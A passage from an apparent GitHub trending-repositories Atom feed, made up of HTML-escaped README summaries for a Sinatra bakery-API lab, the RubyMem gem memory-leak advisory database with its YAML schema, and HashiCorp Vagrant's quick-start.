end&#xA;end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Great! Now, we just need to translate that pseudocode into Ruby:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-rb&#34;&gt;class ApplicationController&#xA;  get &#39;/bakeries&#39; do&#xA;    # get all the bakeries from the database&#xA;    bakeries = Bakery.all&#xA;    # send them back as a JSON array&#xA;    bakeries.to_json&#xA;  end&#xA;end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Try refreshing the page now and make sure the response matches what you expect. Then, run &lt;code&gt;learn test&lt;/code&gt; and work through the remaining deliverables in a similar manner.&lt;/p&gt; &#xA;&lt;h3&gt;Routes&lt;/h3&gt; &#xA;&lt;p&gt;Set up your &lt;code&gt;ApplicationController&lt;/code&gt; so that the &lt;a href=&#34;https://msp-greg.github.io/sinatra/file.README.html#available-settings&#34;&gt;default content type&lt;/a&gt; for responses use the &lt;code&gt;Content-Type: application/json&lt;/code&gt; header. Then, define routes that do the following:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;GET /bakeries&lt;/code&gt;: returns an array of JSON objects for all bakeries in the database.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;GET /bakeries/:id&lt;/code&gt;: returns a single bakery as JSON with its baked goods nested in an array. Use the &lt;code&gt;id&lt;/code&gt; from the URL to look up the correct bakery. (&lt;strong&gt;HINT&lt;/strong&gt;: you&#39;ll need to pass in some custom options to the &lt;a href=&#34;https://api.rubyonrails.org/classes/ActiveModel/Serializers/JSON.html#method-i-as_json&#34;&gt;&lt;code&gt;#to_json&lt;/code&gt;&lt;/a&gt; method.)&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;GET /baked_goods/by_price&lt;/code&gt;: returns an array of baked goods as JSON, sorted by price in descending order. (&lt;strong&gt;HINT&lt;/strong&gt;: how can you use Active Record to sort the baked goods in a particular order?)&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;GET /baked_goods/most_expensive&lt;/code&gt;: returns the single most expensive baked good as JSON. (&lt;strong&gt;HINT&lt;/strong&gt;: how can you use Active Record to sort the baked goods in a particular order?)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Resources&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://rubydoc.info/gems/sinatra#routes&#34;&gt;Sinatra Routes&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://guides.rubyonrails.org/active_record_querying.html&#34;&gt;Active Record Query Interface&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://api.rubyonrails.org/classes/ActiveModel/Serializers/JSON.html#method-i-as_json&#34;&gt;Active Model &lt;code&gt;#as_json&lt;/code&gt; method&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>rubymem/ruby-mem-advisory-db</title>
    <updated>2022-05-30T01:32:15Z</updated>
    <id>tag:github.com,2022-05-30:/rubymem/ruby-mem-advisory-db</id>
    <link href="https://github.com/rubymem/ruby-mem-advisory-db" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Leaky gems advisory database&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Ruby Leaky Gems Database&lt;/h1&gt; &#xA;&lt;p&gt;The &lt;a href=&#34;https://www.rubymem.com&#34;&gt;RubyMem&lt;/a&gt; Database is a community effort to compile all known memory leaks that are relevant to Ruby gems.&lt;/p&gt; &#xA;&lt;p&gt;You can check your own Gemfile.locks against this database by using &lt;a href=&#34;https://github.com/rubymem/bundler-leak&#34;&gt;bundler-leak&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Support Our RubyMem Initiative!&lt;/h2&gt; &#xA;&lt;p&gt;This project has been a community effort since the beginning. The more reports we track, the more value we can provide to your future projects!&lt;/p&gt; &#xA;&lt;h3&gt;How You Can Help&lt;/h3&gt; &#xA;&lt;p&gt;Do you know about a known memory leak that isn&#39;t &lt;a href=&#34;https://www.rubymem.com/advisories&#34;&gt;listed in this database&lt;/a&gt;? Open an issue, submit a PR, or &lt;a href=&#34;https://rubymem.com/advisories/new&#34;&gt;use this form&lt;/a&gt; which will email the maintainers.&lt;/p&gt; &#xA;&lt;h2&gt;Directory Structure&lt;/h2&gt; &#xA;&lt;p&gt;The database is a list of directories that match the names of Ruby libraries on &lt;a href=&#34;https://rubygems.org/&#34;&gt;rubygems.org&lt;/a&gt;. Within each directory are one or more files for the Ruby library. These files can be named however you want, in this example it is named after the PR number in github.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;gems/:&#xA;  celluloid/:&#xA;    612.yml&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Format&lt;/h2&gt; &#xA;&lt;p&gt;Each file contains the information in &lt;a href=&#34;http://www.yaml.org/&#34;&gt;YAML&lt;/a&gt; format:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-yaml&#34;&gt;---&#xA;gem: celluloid&#xA;url: https://github.com/celluloid/celluloid/issues/670&#xA;title: Memory Leak using Celluloid::Future&#xA;date: 2015-08-31&#xA;description: |&#xA;  The Celluloid::Group::Spawner appears to never clean up the completed Threads&#xA;  that it creates.&#xA;leaky_versions:&#xA;  - &#34;&amp;gt; 0.16.0, &amp;lt; 0.17.2&#34;&#xA;patched_versions:&#xA;  - &#34;&amp;gt;= 0.17.3&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Schema&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;gem&lt;/code&gt; [String]: Name of the affected gem.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;framework&lt;/code&gt; [String] (optional): Name of the framework which the affected gem belongs to.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;platform&lt;/code&gt; [String] (optional): If this vulnerability is platform-specific, name of platform this vulnerability affects (e.g. jruby)&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;url&lt;/code&gt; [String]: The URL to the full advisory.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;title&lt;/code&gt; [String]: The title of the advisory or individual vulnerability.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;date&lt;/code&gt; [Date]: The public disclosure date of the advisory.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;description&lt;/code&gt; [String]: One or more paragraphs describing the vulnerability.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;leaky_versions&lt;/code&gt; [String]: The version requirement of the gem with a known memory leak.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;unaffected_versions&lt;/code&gt; [Array&amp;lt;String&amp;gt;] (optional): The version requirements for the unaffected versions of the Ruby library.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;patched_versions&lt;/code&gt; [Array&amp;lt;String&amp;gt;]: The version requirements for the patched versions of the Ruby library.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Tests&lt;/h2&gt; &#xA;&lt;p&gt;Prior to submitting a pull request, run the tests:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;bundle install&#xA;bundle exec rspec&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Credits&lt;/h2&gt; &#xA;&lt;p&gt;Please see &lt;a href=&#34;https://github.com/rubymem/ruby-mem-advisory-db/raw/master/CONTRIBUTORS.md&#34;&gt;CONTRIBUTORS.md&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>hashicorp/vagrant</title>
    <updated>2022-05-30T01:32:15Z</updated>
    <id>tag:github.com,2022-05-30:/hashicorp/vagrant</id>
    <link href="https://github.com/hashicorp/vagrant" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Vagrant is a tool for building and distributing development environments.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Vagrant&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Website: &lt;a href=&#34;https://www.vagrantup.com/&#34;&gt;https://www.vagrantup.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Source: &lt;a href=&#34;https://github.com/hashicorp/vagrant&#34;&gt;https://github.com/hashicorp/vagrant&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;HashiCorp Discuss: &lt;a href=&#34;https://discuss.hashicorp.com/c/vagrant/24&#34;&gt;https://discuss.hashicorp.com/c/vagrant/24&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Vagrant is a tool for building and distributing development environments.&lt;/p&gt; &#xA;&lt;p&gt;Development environments managed by Vagrant can run on local virtualized platforms such as VirtualBox or VMware, in the cloud via AWS or OpenStack, or in containers such as with Docker or raw LXC.&lt;/p&gt; &#xA;&lt;p&gt;Vagrant provides the framework and configuration format to create and manage complete portable development environments. These development environments can live on your computer or in the cloud, and are portable between Windows, Mac OS X, and Linux.&lt;/p&gt; &#xA;&lt;h2&gt;Quick Start&lt;/h2&gt; &#xA;&lt;p&gt;Package dependencies: Vagrant requires &lt;code&gt;bsdtar&lt;/code&gt; and &lt;code&gt;curl&lt;/code&gt; to be available on your system PATH to run successfully.&lt;/p&gt; &#xA;&lt;p&gt;For the quick-start, we&#39;ll bring up a development machine on &lt;a href=&#34;https://www.virtualbox.org/&#34;&gt;VirtualBox&lt;/a&gt; because it is free and works on all major platforms. Vagrant can, however, work with almost any system such as &lt;a href=&#34;https://www.openstack.org/&#34;&gt;OpenStack&lt;/a&gt;, &lt;a href=&#34;https://www.vmware.com/&#34;&gt;VMware&lt;/a&gt;, &lt;a href=&#34;https://docs.docker.com/&#34;&gt;Docker&lt;/a&gt;, etc.&lt;/p&gt; &#xA;&lt;p&gt;First, make sure your development machine has &lt;a href=&#34;https://www.virtualbox.org/&#34;&gt;VirtualBox&lt;/a&gt; installed. After this, &lt;a href=&#34;https://www.vagrantup.com/downloads.html&#34;&gt;download and install the appropriate Vagrant package for your OS&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;To build your first virtual environment:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;vagrant init hashicorp/bionic64&#xA;vagrant up&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Note: The above &lt;code&gt;vagrant up&lt;/code&gt; command will also trigger Vagrant to download the &lt;code&gt;bionic64&lt;/code&gt; box via the specified URL. Vagrant only does this if it detects that the box doesn&#39;t already exist on your system.&lt;/p&gt; &#xA;&lt;h2&gt;Getting Started Guide&lt;/h2&gt; &#xA;&lt;p&gt;To learn how to build a fully functional development environment, follow the &lt;a href=&#34;https://www.vagrantup.com/docs/getting-started&#34;&gt;getting started guide&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Installing from Source&lt;/h2&gt; &#xA;&lt;p&gt;If you want the bleeding edge version of Vagrant, we try to keep main pretty stable and you&#39;re welcome to give it a shot. Please review the installation page &lt;a href=&#34;https://www.vagrantup.com/docs/installation/source&#34;&gt;here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Contributing to Vagrant&lt;/h2&gt; &#xA;&lt;p&gt;Please take time to read the &lt;a href=&#34;https://www.hashicorp.com/community-guidelines&#34;&gt;HashiCorp Community Guidelines&lt;/a&gt; and the &lt;a href=&#34;https://github.com/hashicorp/vagrant/raw/main/.github/CONTRIBUTING.md&#34;&gt;Vagrant Contributing Guide&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Then you&#39;re good to go!&lt;/p&gt;</summary>
  </entry>
</feed>